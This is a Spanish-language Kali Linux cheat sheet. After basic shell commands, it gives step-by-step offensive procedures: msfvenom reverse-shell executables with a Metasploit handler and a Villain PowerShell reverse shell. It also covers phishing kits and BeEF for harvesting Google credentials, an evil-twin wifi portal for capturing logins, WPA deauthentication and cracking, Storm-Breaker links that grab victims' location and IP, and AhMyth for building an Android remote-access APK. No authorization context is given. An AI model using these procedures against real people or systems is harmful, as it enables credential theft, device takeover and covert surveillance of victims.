++ Comandos básicos:
--- pwd (Muestra el directorio en dónde estamos)
--- apt update (Actualiza la lista de paquetes)
--- apt upgrade (Actualiza los paquetes)
--- uname (Brinda el nombre del equipo)
--- uname -r (Brinda la version del kernel)
--- uname -a (Brinda información más detallada del sistema)
--- ls (Lista los archivos que hay en un directorio)
--- cd <nombre_directorio> (Permite entrar a un directorio)
--- cd .. (Permite ir al directorio superior)
--- mkdir <nombre_directorio> (Permite crear directorios)
--- rmdir <nombre_directorio> (Permite borrar un directorio vacío)
--- touch <nombre_archivo> (Permite crear un archivo vacío)
--- rm <nombre_archivo> (Permite borrar un archivo)
--- cat <nombre_archivo> (Permite ver el contenido de un archivo)
--- leafpad <nombre_archivo> (Permite abrir el archivo usando leafpad)
--- mv <nombre_archivo> <nuevo_nombre_archivo> (Permite cambiar el nombre de un archivo)


++ kali-undercover ---> comando usado para tener la apariencia de Windows
--- Recordar tener instlado el paquete: sudo apt-get install kali-undercover

++ kali-undercover --off ---> comando usado para desactivar el modo undercover

++ hydra -l <usuario> -P <lista_de_contraseñas> <ip direccion> ---> comando basico hydra

++ nmap -sP <192.168.1.0/24> ---> muestra los dispositivos conectados a una red 

++ nmap -A <dirección> ---> Realiza un escaneo agresivo, detectando servicios, versiones y sistema operativo 

++ gpg -c <file> ---> Cifrar archivos 

++ msfvenom -p /windows/shell/reverse_tcp LHOST=<ip_local> LPORT=4444 -f exe > <nombre_programa>  ---> crear programa intrusion
---- msfconsole -q ---> escuchar programa intrusion
---- use exploit/multi/handler ---> comando para activar programa intrusion
---- set PAYLOAD windows/shell/reverse_tcp  ---> continuacion activar programa intrusion
---- set LHOST <ip_local> 
---- set LPORT 4444
---- run

++ Herramienta útil para phishing: blackeye
--- Enlace: https://github.com/majordmg/Blackeye-V3

++ Herramienta útil para phishing: zphisher
--- Enlace: https://github.com/htr-tech/zphisher

++ msfvenom 
--- Ejemplo de uso #1: msfvenom -p windows/shell_reverse_tcpe -o funny2.exe
--- Ejemplo de uso #2: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > payload.exe
--- Ejemplo de uso #3: nc -nlvp 443  (Nota: comando usado para escuchar)

++ theHarvester 
--- theHarvester -h (Muestra la información de ayuda referente a la utilidad)
--- theHarvester -d <nombre_del_dominio> -b <nombre_del_buscador_ejemplo_bing>
--- theHarvester -d <nombre_del_dominio> -b <nombre_del_buscador> -f <nombre_reporte.html>
--- xdg-open <nombre_reporte.xml>

++ whois
--- whois <nombre_dominio>
--- utilidad web: https://www.whois.com/

++ sherlock
--- Enlace del proyecto: https://github.com/sherlock-project/sherlock
--- sherlock --help (Muestra la información de ayuda referente a la utilidad)
--- Sintaxis de uso general: sherlock <usuario_1 usuario_2>
--- sherlock <usuario_1 usuario_2> --output results.txt (Guarda la información de salida en un archivo de texto)
--- cat results.txt (Ver la información de salida)

++ setoolkit
--- Escoger opcion <1-6>
--- Opcion 1: Social-Engineering-Attacks
--- Escoger opcion <1-10>
--- Opcion 2: Website Attack Vectors
--- Escoger opcion <1-7>
--- Opcion 3: Credential Harvester Attack Method
--- Escoger opcion <1-3>
--- Opcion 1: Web Templates
--- Presionar enter (dejar la ip por default)
--- Escoger opcion <1-3>
--- Opcion 2: Google
--- Abrir el navegador web e ir a la ip generada por el programa
--- Una vez ingresadas las credenciales las mismas estarán disponibles en el programa

++ Storm-Breaker
--- URL del proyecto: https://github.com/ultrasecurity/Storm-Breaker
--- ssh -R 80:localhost:2525 serveo.net (Para exponer nuestro servidor local al internet usando ssl tunneling)
--- Acceder al url generado
--- Acceder usando las credenciales <admin, admin>
--- Compartir un enlace generado 
--- Esperar a que el enlace generado sea abierto para obtener la información

++ Beefproject
--- URL del proyecto: https://github.com/beefproject/beef
--- Instalar el paquete
--- Una vez instalado ir a la ruta del programa
--- Ejecutar el comando: mousepad config.yaml
--- Verificar el apartado de credenciales
--- Quitar el # en el area de public
--- En esta misma area colocar en la seccion https la opcion true
--- Ejecutar el comando: ssh -R 80:localhost:3000 serveo.net
--- Copiar el url publico generado
--- Ejecutar el comando: mousepad config.yaml
--- Pegar el url publico generado en la seccion public, host
--- Remover del url la parte de https y guardar el archivo
--- Correr nuevamente beef desde el apartado raiz con el comando: ./beef
--- Abrir el url generado por el programa
--- Colocar las credenciales generadas
--- Dar clic en la seccion avanzada
--- En la seccion del url cambiar la ip por la ip copiada en el archivo mousepad config.yaml y dar enter
--- Ir al portal web de beef 
--- Ir a la seccion de commands
--- Ir a la seccion social eng.
--- Ir a la seccion google phishing
--- Dar clic en execute
--- El usuario debe proceder a ingresar sus credenciales
--- En la interfaz web de beef se procederán a ver las credenciales del usuario

++ Crear un punto de red wifi
--- Instalar los siguientes paquetes: apt install dnsmasq hostapd
--- Ejecutar el comando: airmon -ng check kill (Este comando para los procesos que puedan intervenir con el modo monitor)
--- Ejecutar el comando: mousepad /etc/apache2/sites-enabled/000-default.conf (Este comando nos permite editar el portal web de autenticacion)
--- Pegar los siguientes comandos en el archivo:
<Directory "/var/www/html">
RewriteEngine On
RewriteBase /
RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]
RewriteRule ^(.*)$ http://%1/$1 [R=301,L]

RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ / [L,QSA]
</Directory>
--- Guardar el archivo
--- Ejecutar el siguiente comando: a2enmod rewrite && service apache2 start
(Permite habilitar los modulos de apache y reiniciar el servicio)
--- Ejecutar el siguiente comando: dnsmasq -C ~/dnsmasq.conf hostapd ~/hostapd.conf -B (Permite redireccionar el trafico al wifi que vamos a crear)
--- Ejecutar el siguiente comando: ifconfig wlan0 192.168.1.1/24 
--- Clonar el repositorio RougeWifi: https://github.com/s0meguy1/RougeWifi
--- Ir a la raiz del repositorio 
--- Ejecutar el comando: rm -rf wifi.sh
--- Ejecutar el comando: cp -r * /var/www/html/
--- Reiniciar el sistema
--- Ejecutar los siguientes comandos:
airmon-ng check kill
service apache2 start
dnsmasq -C /root/dnsmasq.conf  
hostapd /root/hostapd.conf -B
ifconfig wlan0 192.168.1.1/24
--- Ejecutar el comando:
tshark -i wlan0 -w capture.cap
--- El wifi aparecerá visible 
--- Una vez el objetivo ingrese al wifi e ingrese credenciales se puede ver lo capturado
--- Ejecutar el siguiente comando: wireshark capture.cap
--- Verificar la seccion protocolo (HTTP) y luego la seccion HTML, estando allí ubicar las credenciales

++ Página útil para verificar campañas de phishing:
-- URL: https://phishtank.org/index.php

++ Metasploitable
--- URL: https://sourceforge.net/projects/metasploitable/

++ Brute-Force
--- URL: https://github.com/ElliotAlderson51/Brute-Force
--- Navegar a ruta del programa
--- Ejecutar el siguiente comando: python3 ZipCracker.py
--- Ingresar el nombre o la direccion del archivo
--- Ingresar el nombre del archivo de lista (diccionario)


++ StegHide
--- Comando para instalar: sudo apt-get install steghide
--- steghide --help (Brinda los comandos relacionados al programa)
--- steghide --embed -ef <archivo_texto> -cf <archivo_imagen> (Permite incrustar un texto oculto en una imagen)
--- Igresar una contraseña
--- steghide --extract -sf <archivo_imagen> -xf <archivo_texto> (Permite extraer la data de la imagen)
--- Ingresar la contraseña previamente establecida
--- Abrir el archivo generado para comprobar la información extraída

++ Ataque a red wifi (usando airodump-ng)
--- Comandos a ejecutar:
--- ifconfig wlan0 down
--- ifconfig wlan0 mode monitor
--- ifconfig wlan0 up
--- airodump-ng wlan0 (Este comando permite ver las redes wifi activas)
--- airodump-g --bssid <BSSID> --channel 6 --write new wlan0
--- Abrir otro cmd
--- aireplay-ng --deauth 20 -a <BSSID> -c <STMAC> wlan0
--- Esperar a que aparezca el mensaje: Network is down
--- ls
--- Visualizar los archivos generados
--- aircrack-ng <new-02.cap> -w <word.txt>
--- Copiar la llave encontrada

++ Villain Tool
--- URL: https://github.com/t3l3machus/Villain
--- Navegar al directorio del programa
--- Instalar las dependencias: pip3 install -r requirements.txt
--- python3 Villain.py
--- help generate
--- generate payload=windows/netcat/powershell_reverse_tcp lhost=eth0 encode (Permite generar un payload para Windows)
--- Copiar el comando de powershell generado
--- Pegar dicho comando en powershell 
--- Ejecutar en la terminal: sessions 
--- shell <session_ID>
--- Se mostrará el mensaje: Interactive pseudo-shell activated
--- En estos momentos ya tenemos control del sistema Windows y podemos ejecutar comandos
--- Comandos tales como: 
dir (Ver directorios)
mkdir <nombre directorio>  (Crear directorio)
rmdir <nombre directorio> (Borrar directorio)

++ AhMyth
--- URL: https://github.com/Rabbit-xd/AhMyth
--- Ejecutar los siguientes comandos tras clonado del repositorio
--- autoinstall_linux
--- Abrir otra terminal
--- Ejecutar ./ngrok tcp 8484 (Recordar estar en el directorio de ngrok)
--- Copiar el enlace generado (sección forwarding)
--- Ejecutar en terminal: ahmyth
--- En la interfaz gráfica que se nos muestra ir a la seccion apk builder
--- Estando alli, pegar el enlace generado en la sección server ip
--- Dejar toda la sección de permisos activa
--- Dar clic en el boton build
--- El programa procederá a generar un apk
--- Una vez la aplicación ha sido instalada se procederá a actualizar el apartado de victimas en la interfaz del programa

++ Storm-Breaker (para fines de geolocalizacion)
--- URL: https://github.com/ultrasecurity/Storm-Breaker
--- Navegar al directorio 
--- Ejecutar los siguientes comandos:
--- bash install.sh
--- pip3 install -r requirements.txt
--- python3 st.py
--- Navegar al directorio de ngrok y ejecutar: ./ngrok http 2525
--- Copiar el enlace generado de la sección de forwarding
--- Acceder a dicho enlace
--- Colocar las credenciales: admin/admin
--- Copiar uno de los enlaces generados
--- Una vez abierto dicho enlace nos será visible toda la información referente (S.O. - ubicación - IP y más)

++ IPDRONE
--- URL: https://github.com/iamambarish/ipdrone
--- Navegar al directorio
--- python3 ipdrone.py -v <ip>
--- Una vez ejecutado tendremos visible la información referente a dicha ip

++ Crunch 
--- crunch 2 6 123456 -o worldlist.txt (2= longitud mínima - 6 = longitud máxima - 123456 = conjunto de caracteres que comprenden la lista)
--- leafpad <nombre_de_la_lista> (Para abrir la lista generada)

++ Spoof del MAC address
--- ifconfig
--- ifconfig eth0 down (eth0 puede ser otra interfaz de red)
--- ifconfig eth0 ether <dirección_mac_distinta>
--- ifconfig eth0 up
--- ifconfig

++ Macof 
--- macof --help 
--- macof -i <interfaz_red> -s <ip_router>
--- Se enviarán una serie de solicitudes al router que pueden ocasionar su apagado

++ Honeypot
--- URL: https://github.com/technicaldada/pentbox
--- Acceder al directorio del proyecto
--- ruby pentbox.rb 
--- Escoger la opción (2- Network tools)
--- Escoger la opción (3- Honeypot)
--- Escoger la opción (2- Manual Configuration)
--- Indiciar un puerto abierto (ejemplo: 80)
--- Indicar un mensaje (ejemplo: I got your ip address)
--- Save a log with intrusion = n
--- Activate beep sound when intrusion = y
--- Verificar nuestra ip con ifconfig
--- Acceder a la ip desde un navegador web usando el puerto (ejemplo 192.168.1.120:80)
--- Al acceder a la ip se verá el mensaje falso colocado
--- En la terminal veremos la ip de quien ha entrado a la ip (En este caso somos nosotros mismos, pero en un escenario real nos mostraría a la ip vinculada al usuario o dispositivo)

++ Tools (Dark Web)
--- Torch
--- ahmia
--- darksearchio
--- Onionland
--- notevil
--- phobos
--- torgle
--- tor66
--- haystack
--- tormax

































